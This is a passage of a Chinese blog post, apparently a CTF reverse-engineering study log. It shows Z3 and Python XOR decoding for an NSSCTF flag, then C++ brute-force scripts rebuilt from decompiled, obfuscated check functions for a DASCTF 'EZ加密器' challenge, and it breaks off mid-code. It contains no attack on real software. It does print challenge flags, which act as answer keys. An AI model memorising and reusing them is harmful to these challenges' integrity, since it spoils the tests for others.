class="line">    s.add(Or(r1 != m[r1], r2 != m[r2], r3 != m[r3], j != m[j]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一开始我写的是s.add(And(r1 != m[r1], r2 != m[r2], r3 != m[r3], j != m[j]))，只有一个解但是怎么都出不来，最后发现原来是用Or,但是最后还是出不来，因为r2的情况太多了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0x69</span>, <span class="number">0x5F</span>, <span class="number">0x77</span>, <span class="number">0x69</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, <span class="number">0x5F</span>, <span class="number">0x63</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x5F</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x5F</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x62</span>, <span class="number">0x75</span>, <span class="number">0x67</span>, <span class="number">0x5F</span>, <span class="number">0x6F</span>, <span class="number">0x72</span>, <span class="number">0x5F</span>, <span class="number">0x6E</span>, <span class="number">0x6F</span>, <span class="number">0x74</span>]</span><br><span class="line"></span><br><span class="line">last = [<span class="number">0x3e3a460533286f0d</span>,<span class="number">0x0c00020130082c0c</span>,<span class="number">0x08020717153e3013</span>,<span class="number">0x32310600</span>]</span><br><span class="line">tryi = hextbyte(last,<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">pl(pxor(tryi,key),<span class="string">&quot;NSSCTF&quot;</span>)</span><br><span class="line"><span class="comment"># NSSCTF&#123;We1l_D0ndeajoa_Slgebra_am_i&#125;</span></span><br></pre></td></tr></table></figure><p>这个还是不对，看了wp发现比赛中间给了hint把中间修改即可<code>e!P0or_a</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;We<span class="number">1</span>l_D<span class="number">0</span><span class="keyword">ne</span><span class="title">!P0or_algebra_am_i</span>&#125;</span><br></pre></td></tr></table></figure><hr><p>写了两道cpp，其实内核还是分析函数作用，然后进行算法逆向，下一周尝试写一点cpp代码然后看看反编译后的样子</p><h1>RE其它内容</h1><h2 id="EZ加密器">EZ加密器</h2><p>这题超抽象，全是混淆，可以说根本不知道在干什么，但是由于输入的长度很少，基本上爆破就可以解决。</p><p>主函数是一个检查函数+base64加密函数+DES加密函数+最后的转hex字符</p><p>一个一个分析</p><p><img src="https://s2.loli.net/2024/03/13/dVw5meqJz9fX42a.png" alt="image-20240313215958869"></p><p>怕是分析不出来什么。。所以就进入了每个函数把所有逻辑复制下来然后爆破</p><p>第一个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">//int len; // eax</span></span><br><span class="line"><span class="comment">//unsigned int v3; // r11d</span></span><br><span class="line"><span class="comment">//int v4; // edx</span></span><br><span class="line"><span class="comment">//int v5; // r8d</span></span><br><span class="line"><span class="comment">//int v6; // ecx</span></span><br><span class="line"><span class="comment">//int v7; // r8d</span></span><br><span class="line"><span class="comment">//int v8; // r9d</span></span><br><span class="line"><span class="comment">//int v9; // ecx</span></span><br><span class="line"><span class="comment">//char* p_code; // rcx</span></span><br><span class="line"><span class="comment">//unsigned int this_code; // r8d</span></span><br><span class="line"><span class="comment">//int v12; // eax</span></span><br><span class="line"><span class="comment">//int v13; // edx</span></span><br><span class="line"><span class="comment">//int v14; // r9d</span></span><br><span class="line"><span class="comment">//int v15; // edx</span></span><br><span class="line"><span class="comment">//int v16; // r10d</span></span><br><span class="line"><span class="comment">//unsigned int v17; // edx</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// len = strlen(code);</span></span><br><span class="line"><span class="comment">//for (int q = 0; q &lt;= 30; q++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//len = q;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;this try: &quot; &lt;&lt; len;</span></span><br><span class="line"><span class="comment">//v4 = -7;</span></span><br><span class="line"><span class="comment">//v5 = 1;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 = v5;</span></span><br><span class="line"><span class="comment">//v7 = v4 &amp; v5;</span></span><br><span class="line"><span class="comment">//v8 = v4;</span></span><br><span class="line"><span class="comment">//v4 ^= v6;</span></span><br><span class="line"><span class="comment">//v5 = 2 * v7;</span></span><br><span class="line"><span class="comment">//&#125; while (v5);</span></span><br><span class="line"><span class="comment">//if (v6 != v8)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v9 = len;</span></span><br><span class="line"><span class="comment">//len ^= v4;</span></span><br><span class="line"><span class="comment">//v4 = 2 * (v4 &amp; v9);</span></span><br><span class="line"><span class="comment">//&#125; while (v4);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">///*code[6] = 0;</span></span><br><span class="line"><span class="comment">//p_code = code;*/</span></span><br><span class="line"><span class="comment">//v3 = len == 0;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;and result &quot; &lt;&lt; v3 &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>验证码是6位</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//void find_password() &#123;</span></span><br><span class="line"><span class="comment">//std::string chars = &quot;0123456789&quot;;</span></span><br><span class="line"><span class="comment">//int v12, v13, v14, v15, v16, v17;</span></span><br><span class="line"><span class="comment">//bool v3;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; chars.size(); ++i) &#123;</span></span><br><span class="line"><span class="comment">//for (int j = 0; j &lt; chars.size(); ++j) &#123;</span></span><br><span class="line"><span class="comment">//for (int k = 0; k &lt; chars.size(); ++k) &#123;</span></span><br><span class="line"><span class="comment">//for (int l = 0; l &lt; chars.size(); ++l) &#123;</span></span><br><span class="line"><span class="comment">//for (int m = 0; m &lt; chars.size(); ++m) &#123;</span></span><br><span class="line"><span class="comment">//for (int n = 0; n &lt; chars.size(); ++n) &#123;</span></span><br><span class="line"><span class="comment">//std::string password = &#123; chars[i], chars[j], chars[k], chars[l], chars[m], chars[n] &#125;;</span></span><br><span class="line"><span class="comment">//const char* p_code = password.c_str();</span></span><br><span class="line"><span class="comment">//v3 = true;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//do &#123;</span></span><br><span class="line"><span class="comment">//int this_code = *p_code;</span></span><br><span class="line"><span class="comment">//v12 = -49;</span></span><br><span class="line"><span class="comment">//v13 = 1;</span></span><br><span class="line"><span class="comment">//do &#123;</span></span><br><span class="line"><span class="comment">//v14 = v13;</span></span><br><span class="line"><span class="comment">//v15 = v12 &amp; v13;</span></span><br><span class="line"><span class="comment">//v16 = v12;</span></span><br><span class="line"><span class="comment">//v12 ^= v14;</span></span><br><span class="line"><span class="comment">//v13 = 2 * v15;</span></span><br><span class="line"><span class="comment">//&#125; while (v13);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (v14 != v16) &#123;</span></span><br><span class="line"><span class="comment">//do &#123;</span></span><br><span class="line"><span class="comment">//v17 = this_code;</span></span><br><span class="line"><span class="comment">//this_code ^= v12;</span></span><br><span class="line"><span class="comment">//v12 = 2 * (v12 &amp; v17);</span></span><br><span class="line"><span class="comment">//&#125; while (v12);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (this_code &gt;= 0xA) &#123;</span></span><br><span class="line"><span class="comment">//v3 = false;</span></span><br><span class="line"><span class="comment">//break;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//++p_code;</span></span><br><span class="line"><span class="comment">//&#125; while (*p_code);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (v3) &#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;Found a password: &quot; &lt;&lt; password &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">//find_password();</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>验证码是数字</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//int main(void) &#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int len; // eax</span></span><br><span class="line"><span class="comment">//int v3; // edx</span></span><br><span class="line"><span class="comment">//int v4; // r8d</span></span><br><span class="line"><span class="comment">//int v5; // r9d</span></span><br><span class="line"><span class="comment">//int v6; // r8d</span></span><br><span class="line"><span class="comment">//int v7; // r10d</span></span><br><span class="line"><span class="comment">//int v8; // r8d</span></span><br><span class="line"><span class="comment">//unsigned int ans; // r11d</span></span><br><span class="line"><span class="comment">//__int64 v10; // r10</span></span><br><span class="line"><span class="comment">//int v11; // ecx</span></span><br><span class="line"><span class="comment">//int v12; // edx</span></span><br><span class="line"><span class="comment">//int v13; // eax</span></span><br><span class="line"><span class="comment">//int v14; // r8d</span></span><br><span class="line"><span class="comment">//int v15; // edx</span></span><br><span class="line"><span class="comment">//int v16; // r9d</span></span><br><span class="line"><span class="comment">//int v17; // edx</span></span><br><span class="line"><span class="comment">//char v19[42]; // [rsp+2Eh] [rbp-2Ah] BYREF</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (int p = 1; p &lt;= 100; p++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//len = p;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;this try: &quot; &lt;&lt; len;</span></span><br><span class="line"><span class="comment">//v3 = -41;</span></span><br><span class="line"><span class="comment">//v4 = 1;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v5 = v4;</span></span><br><span class="line"><span class="comment">//v6 = v3 &amp; v4;</span></span><br><span class="line"><span class="comment">//v7 = v3;</span></span><br><span class="line"><span class="comment">//v3 ^= v5;</span></span><br><span class="line"><span class="comment">//v4 = 2 * v6;</span></span><br><span class="line"><span class="comment">//&#125; while (v4);</span></span><br><span class="line"><span class="comment">//if (v5 != v7)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v8 = len;</span></span><br><span class="line"><span class="comment">//len ^= v3;</span></span><br><span class="line"><span class="comment">//v3 = 2 * (v3 &amp; v8);</span></span><br><span class="line"><span class="comment">//&#125; while (v3);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//ans = 0;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;and result: &quot; &lt;&lt; len &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;cstring&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//__int64 check(__int64 a1) &#123;</span></span><br><span class="line"><span class="comment">//// Your function here</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//void find_flag() &#123;</span></span><br><span class="line"><span class="comment">//std::string flag(40, &#x27;0&#x27;);  // Initialize a flag string of length 40 with &#x27;0&#x27;</span></span><br><span class="line"><span class="comment">//int v12, v13, v14, v15, v16, v17;</span></span><br><span class="line"><span class="comment">//bool ans;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// Set the specific positions to &quot;DASCTF&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment">//std::string initial = &quot;DASCTF&#123;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 8; ++i) &#123;</span></span><br><span class="line"><span class="comment">//flag[i] = initial[i];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// Check the flag</span></span><br><span class="line"><span class="comment">//if (check((__int64)flag.c_str())) &#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;The flag: &quot; &lt;&lt; flag &lt;&lt; &quot; satisfies the condition.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else &#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;The flag: &quot; &lt;&lt; flag &lt;&lt; &quot; does not satisfy the condition.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">//find_flag();</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag的长度40和开头结尾要求</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span>* p_lastflag; <span class="comment">// r8</span></span><br><span class="line"><span class="type">char</span>* p_str2; <span class="comment">// rcx</span></span><br><span class="line"><span class="type">char</span>* end; <span class="comment">// r9</span></span><br><span class="line"><span class="type">char</span> v6; <span class="comment">// si</span></span><br><span class="line"><span class="type">unsigned</span> __int8 left; <span class="comment">// di</span></span><br><span class="line"><span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v9; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> v10; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v12; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line"><span class="type">int</span> v14; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v15; <span class="comment">// r12d</span></span><br><span class="line"><span class="type">int</span> v16; <span class="comment">// edi</span></span><br><span class="line"><span class="type">char</span> v17; <span class="comment">// di</span></span><br><span class="line"><span class="type">int</span> v18; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v19; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> v21; <span class="comment">// esi</span></span><br><span class="line"><span class="type">int</span> v22; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v23; <span class="comment">// esi</span></span><br><span class="line"><span class="type">int</span> v24; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v25; <span class="comment">// esi</span></span><br><span class="line"><span class="type">int</span> v26; <span class="comment">// ebp</span></span><br><span class="line"><span class="type">int</span> v27; <span class="comment">// esi</span></span><br><span class="line"><span class="type">char</span>* saved_flag; <span class="comment">// [rsp+20h] [rbp-D8h] BYREF</span></span><br><span class="line">__int64 slen; <span class="comment">// [rsp+28h] [rbp-D0h]</span></span><br><span class="line"><span class="type">char</span> afterbase[<span class="number">8</span>]; <span class="comment">// [rsp+38h] [rbp-C0h] BYREF</span></span><br><span class="line"><span class="type">char</span> Str2[<span class="number">184</span>]; <span class="comment">// [rsp+40h] [rbp-B8h] BYREF</span></span><br><span class="line">slen = <span class="number">1</span>;</span><br><span class="line">p_lastflag = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line">*p_lastflag = k;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">int</span>)slen &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">end = Str2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">p_str2 = Str2;</span><br><span class="line">end = &amp;Str2[<span class="number">2</span> * (<span class="type">int</span>)slen];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v6 = *p_lastflag;</span><br><span class="line">left = (<span class="type">unsigned</span> __int8)*p_lastflag &gt;&gt; <span class="number">4</span>;</span><br><span class="line">v8 = left;</span><br><span class="line"><span class="keyword">if</span> (left &lt;= <span class="number">9u</span>)</span><br><span class="line">&#123;</span><br><span class="line">v9 = left ^ <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">if</span> (!left)</span><br><span class="line">v9 = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v9 = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v10 = v9 &amp; v8;</span><br><span class="line">v9 ^= v8;</span><br><span class="line">v8 = <span class="number">2</span> * v10;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">2</span> * v10);</span><br><span class="line">v11 = <span class="number">-11</span>;</span><br><span class="line">v12 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v13 = v12;</span><br><span class="line">v14 = v11 &amp; v12;</span><br><span class="line">v15 = v11;</span><br><span class="line">v11 ^= v13;</span><br><span class="line">v12 = <span class="number">2</span> * v14;</span><br><span class="line">&#125; <span class="keyword">while</span> (v12);</span><br><span class="line"><span class="keyword">if</span> (v13 != v15)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v16 = v9 &amp; v11;</span><br><span class="line">v9 ^= v11;</span><br><span class="line">v11 = <span class="number">2</span> * v16;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">2</span> * v16);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">*p_str2 = v9;</span><br><span class="line">p_str2 += <span class="number">2</span>;</span><br><span class="line">v17 = v6 &amp; <span class="number">0xF</span>;</span><br><span class="line">v18 = v6 &amp; <span class="number">0xF</span>;</span><br><span class="line"><span class="keyword">if</span> ((v6 &amp; <span class="number">0xF</span>u) &gt; <span class="number">9</span>)</span><br><span class="line">&#123;</span><br><span class="line">v19 = <span class="number">65</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v21 = v19 &amp; v18;</span><br><span class="line">v19 ^= v18;</span><br><span class="line">v18 = <span class="number">2</span> * v21;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">2</span> * v21);</span><br><span class="line">v22 = <span class="number">-11</span>;</span><br><span class="line">v23 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v24 = v23;</span><br><span class="line">v25 = v22 &amp; v23;</span><br><span class="line">v26 = v22;</span><br><span class="line">v22 ^= v24;</span><br><span class="line">v23 = <span class="number">2</span> * v25;</span><br><span class="line">&#125; <span class="keyword">while</span> (v23);</span><br><span class="line"><span class="keyword">if</span> (v24 != v26)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v27 = v19;</span><br><span class="line">v19 ^= v22;</span><br><span class="line">v22 = <span class="number">2</span> * (v22 &amp; v27);</span><br><span class="line">&#125; <span class="keyword">while</span> (v22);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v19 = v17 ^ <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">if</span> (!v17)</span><br><span class="line">v19 = <span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line">*(p_str2 - <span class="number">1</span>) = v19;</span><br><span class="line">++p_lastflag;</span><br><span class="line">&#125; <span class="keyword">while</span> (p_str2 != end);</span><br><span class="line">&#125;</span><br><span class="line">*end = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; std::hex &lt;&lt; k &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; Str2[<span class="number">0</span>] 